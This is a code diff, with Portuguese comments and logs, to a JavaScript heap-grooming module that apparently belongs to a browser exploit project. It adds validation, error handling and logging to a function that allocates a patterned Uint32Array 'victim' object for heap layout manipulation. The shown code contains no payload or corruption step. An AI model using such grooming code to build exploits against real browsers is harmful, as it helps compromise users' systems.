@@ -26,16 +26,26 @@ export async function groomHeapForSameSize(spray_count, object_size, intermediat
     log("Heap grooming (tentativa) concluído.", "warn", FNAME_GROOM);
 }
 
+// js/heap_groomer.mjs
 export async function prepareVictim(object_size) {
     const FNAME_PREP_VICTIM = "HeapGroomer.prepareVictim";
-    victim_object = null; // Reset
+    victim_object = null; // Reset é importante
     victim_object_type = 'TypedArray';
+    appLog(`Tentando preparar vítima com object_size: ${object_size}`, "info", FNAME_PREP_VICTIM); // Log adicional
+
     const victim_typed_array_elements = object_size / 4;
-    if (object_size % 4 !== 0) {
-        log("ERRO CRÍTICO: Tamanho alvo não é múltiplo de 4 para Uint32Array.", "error", FNAME_PREP_VICTIM); return false;
+    if (object_size % 4 !== 0 || object_size <= 0) { // Adicionado object_size <= 0
+        appLog(`ERRO CRÍTICO: Tamanho do objeto (${object_size}) inválido (não é múltiplo de 4 ou é <=0).`, "error", FNAME_PREP_VICTIM);
+        return false;
     }
-    victim_object = new Uint32Array(victim_typed_array_elements);
-    for(let i=0; i < victim_object.length; i++) { victim_object[i] = (0xBB000000 | i) ; }
-    log(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
-    return true;
+    try {
+        victim_object = new Uint32Array(victim_typed_array_elements);
+        for(let i=0; i < victim_object.length; i++) { victim_object[i] = (0xBB000000 | i) ; }
+        appLog(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
+        return true;
+    } catch (e) {
+        appLog(`ERRO ao alocar Uint32Array para vítima: ${e.message}`, "error", FNAME_PREP_VICTIM);
+        victim_object = null; // Garante que está nulo em caso de erro
+        return false;
+    }
 }
